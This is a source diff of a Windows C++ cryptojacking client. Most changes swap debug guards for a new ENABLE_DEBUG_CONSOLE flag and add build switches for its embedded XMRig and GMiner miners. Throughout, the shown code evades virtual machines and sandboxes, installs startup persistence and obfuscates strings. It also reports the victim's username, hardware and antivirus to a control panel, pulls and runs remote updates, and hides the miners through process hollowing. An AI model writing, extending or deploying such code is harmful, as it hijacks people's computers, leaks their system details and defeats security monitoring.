@@ -43,7 +43,7 @@ static volatile bool g_shouldExit = false;  // Flag to signal exit on Ctrl+C
 BOOL WINAPI ConsoleHandler(DWORD signal) {
     if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
         signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
 #endif
         
@@ -96,7 +96,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         std::string response = fetchJsonFromUrl(StringToLPWSTR(versionUrl), 0);
         
         if (response.empty()) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to check for updates from: " << versionUrl << std::endl;
 #endif
             return false;
@@ -128,13 +128,13 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         
         // Check if version is different
         if (panelVersion.empty() || panelVersion == currentVersion || downloadUrl.empty()) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[*] No update available. Current: " << currentVersion << ", Server: " << panelVersion << std::endl;
 #endif
             return false;
         }
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[!] Update available! Current: " << currentVersion << ", Available: " << panelVersion << std::endl;
         std::cout << "[*] Download URL: " << downloadUrl << std::endl;
 #endif
@@ -151,7 +151,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
             return false;
         }
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Downloaded update: " << updateSize << " bytes" << std::endl;
 #endif
         
@@ -198,7 +198,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         CloseHandle(tempFile);
         free(updateBuf);
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Update written to temp file" << std::endl;
 #endif
         
@@ -247,7 +247,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         }
         CloseHandle(batchFile);
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Created update batch script" << std::endl;
 #endif
         
@@ -270,7 +270,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Update batch started, exiting..." << std::endl;
 #endif
         
@@ -286,7 +286,7 @@ int main(int argc, char *argv[])
 {
     // Check if another instance is already running
     if (IsAnotherInstanceRunning("Global\\CMM")) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
 #endif
         return 0;
@@ -294,7 +294,7 @@ int main(int argc, char *argv[])
 
     // Register signal handler to cleanup miner process on termination
     if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << OBFUSCATE_STRING("[-] Failed to set console control handler").c_str() << std::endl;
 #endif
     }
@@ -303,13 +303,13 @@ int main(int argc, char *argv[])
     // Run anti-VM detection
     auto vmResult = AntiVM::DetectVM();
     if (vmResult.first) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
 #endif
         // Exit silently in release mode to avoid detection
         return 0;
     }
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
 #endif
 #endif
@@ -317,11 +317,11 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_PERSISTENCE
     // Add to startup for persistence
     if (Persistence::AddToStartup()) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Successfully added to startup" << std::endl;
 #endif
     } else {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] Failed to add to startup" << std::endl;
 #endif
     }
@@ -342,7 +342,7 @@ int main(int argc, char *argv[])
     const std::string GMINER_SSL = OBFUSCATE_STRING(" --ssl");
     const std::string GMINER_TAIL = OBFUSCATE_STRING(" --templimit 95 --api 10050 -w 0");
     
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
     std::cout << "[DEBUG] Decrypted Config URL: " << (configGetUrlStr.empty() ? "(not set)" : configGetUrlStr) << std::endl;
 #endif
@@ -360,7 +360,7 @@ int main(int argc, char *argv[])
     // Determine which config fetch method to use
     if (!configGetUrlStr.empty()) {
         // Use direct GET request to fetch config with fallback
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Fetching configuration from URL via GET request..." << std::endl;
 #endif
         if (!configManager.FetchConfigFromUrlWithFallback(configGetUrlStr)) {
@@ -370,7 +370,7 @@ int main(int argc, char *argv[])
     } else {
         // Use traditional method: send system info and POST to panel
         
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] System Information:" << std::endl;
         std::cout << "    Username: " << pcUsername << std::endl;
         std::cout << "    Device Hash: " << deviceHash << std::endl;
@@ -380,7 +380,7 @@ int main(int argc, char *argv[])
 #endif
         
         // Fetch configuration from panel(s) with fallback support
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Fetching configuration from panel..." << std::endl;
 #endif
         if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
@@ -429,35 +429,42 @@ int main(int argc, char *argv[])
         std::cout << "[+] Downloaded GMiner: " << gminerPayloadSize << " bytes" << std::endl;
     }
 #else
-    // Load XMRig miner from embedded resource
+    // Load embedded miners
     size_t xmrigPayloadSize = 0;
     BYTE *xmrigBuf = nullptr;
     
+#ifdef ENABLE_CPU_MINER
+    // Load XMRig miner from embedded resource
     try {
         LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
+#ifdef ENABLE_DEBUG_CONSOLE
+        std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
+#endif
     } catch (const std::exception& e) {
         std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
         return -1;
     }
-
-#ifdef _DEBUG
-    std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
+#else
+    std::cout << "[*] CPU miner not enabled in this build" << std::endl;
 #endif
 
     // Load GMiner from embedded resource
     size_t gminerPayloadSize = 0;
     BYTE *gminerBuf = nullptr;
     
+#ifdef ENABLE_GPU_MINER
     try {
         LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+#ifdef ENABLE_DEBUG_CONSOLE
+        std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
     } catch (const std::exception& e) {
         std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
         gminerBuf = nullptr;
         gminerPayloadSize = 0;
     }
-
-#ifdef _DEBUG
-    std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
+#else
+    std::cout << "[*] GPU miner not enabled in this build" << std::endl;
 #endif
 #endif
 
@@ -474,7 +481,7 @@ int main(int argc, char *argv[])
     MinerConfig lastCpuConfig = cpuConfig;
     MinerConfig lastGpuConfig = gpuConfig;
     
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
 #endif
 
@@ -488,7 +495,7 @@ int main(int argc, char *argv[])
         Sleep(500);  // Give system time to stabilize after injection
         cpuPi = ProcessStorage::GetProcess(cpuPid);
         if (cpuPid != 0) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
 #endif
         } else {
@@ -518,7 +525,7 @@ int main(int argc, char *argv[])
             }
             gminer_args += GMINER_TAIL;
             
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
             std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
 #endif
@@ -528,7 +535,7 @@ int main(int argc, char *argv[])
             gpuPi = ProcessStorage::GetProcess(gpuPid);
             
             if (gpuPid != 0) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
 #endif
             } else {
@@ -567,11 +574,11 @@ int main(int argc, char *argv[])
     const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)
 
     // Check for updates at startup
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Checking for client updates at startup..." << std::endl;
 #endif
     if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Update applied at startup, exiting..." << std::endl;
 #endif
         return 0;
@@ -596,7 +603,7 @@ int main(int argc, char *argv[])
             }
             
             if (cpuHashrate >= 0 || gpuHashrate >= 0) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[*] Checking for config updates..." << std::endl;
 #endif
                 
@@ -632,7 +639,7 @@ int main(int argc, char *argv[])
                     
                     // Handle CPU config change
                     if (cpuConfigChanged) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                         std::cout << "[!] CPU config changed on server" << std::endl;
 #endif
                         
@@ -660,11 +667,11 @@ int main(int argc, char *argv[])
                             
                             cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(newCpuCommand));
                             cpuPi = ProcessStorage::GetProcess(cpuPid);
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[+] CPU miner restarted with new config. New PID: " << cpuPid << std::endl;
 #endif
                         } else {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[*] CPU mining disabled in new config, keeping it stopped" << std::endl;
 #endif
                         }
@@ -672,7 +679,7 @@ int main(int argc, char *argv[])
                     
                     // Handle GPU config change
                     if (gpuConfigChanged) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                         std::cout << "[!] GPU config changed on server" << std::endl;
 #endif
                         
@@ -706,11 +713,11 @@ int main(int argc, char *argv[])
                             
                             gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                             gpuPi = ProcessStorage::GetProcess(gpuPid);
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[+] GPU miner restarted with new config. New PID: " << gpuPid << std::endl;
 #endif
                         } else {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                             std::cout << "[*] GPU mining disabled in new config, keeping it stopped" << std::endl;
 #endif
                         }
@@ -726,7 +733,7 @@ int main(int argc, char *argv[])
             
             // If idle status changed, restart the miner with updated CPU usage
             if (cpuIsIdle != g_lastCpuIdleStatus) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[*] CPU idle status changed from " << (g_lastCpuIdleStatus ? "IDLE" : "BUSY") << " to " << (cpuIsIdle ? "IDLE" : "BUSY") << ", restarting miner..." << std::endl;
 #endif
                 g_lastCpuIdleStatus = cpuIsIdle;
@@ -745,12 +752,12 @@ int main(int argc, char *argv[])
                     std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                     cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
                     cpuPi = ProcessStorage::GetProcess(cpuPid);
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                     std::cout << "[+] CPU miner restarted with " << (cpuIsIdle ? "IDLE" : "BUSY") << " settings. New PID: " << cpuPid << std::endl;
 #endif
                 }
             } else if (!IsPidRunning(cpuPid)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[!] CPU miner process (PID " << cpuPid << ") is NOT running." << std::endl;
 #endif
                 // Restart if CPU is still enabled
@@ -760,7 +767,7 @@ int main(int argc, char *argv[])
                     cpuPi = ProcessStorage::GetProcess(cpuPid);
                 }
             } else {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[+] CPU miner process (PID " << cpuPid << ") is running" << std::endl;
 #endif
                 // Handle process suspension based on monitoring
@@ -775,7 +782,7 @@ int main(int argc, char *argv[])
         // Monitor GPU miner process
         if (gpuPid != 0) {
             if (!IsPidRunning(gpuPid)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[!] GPU miner process (PID " << gpuPid << ") is NOT running." << std::endl;
 #endif
                 // Restart if GPU is still enabled
@@ -793,7 +800,7 @@ int main(int argc, char *argv[])
                     gpuPi = ProcessStorage::GetProcess(gpuPid);
                 }
             } else {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[+] GPU miner process (PID " << gpuPid << ") is running" << std::endl;
 #endif
                 // Handle process suspension based on monitoring
@@ -809,12 +816,12 @@ int main(int argc, char *argv[])
         updateCheckCounter++;
         if (updateCheckCounter >= UPDATE_CHECK_INTERVAL) {
             updateCheckCounter = 0;
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cout << "[*] Checking for client updates..." << std::endl;
 #endif
             // Check and apply update if available
             if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[+] Update applied, exiting..." << std::endl;
 #endif
                 // Exit gracefully so the batch script can replace the executable
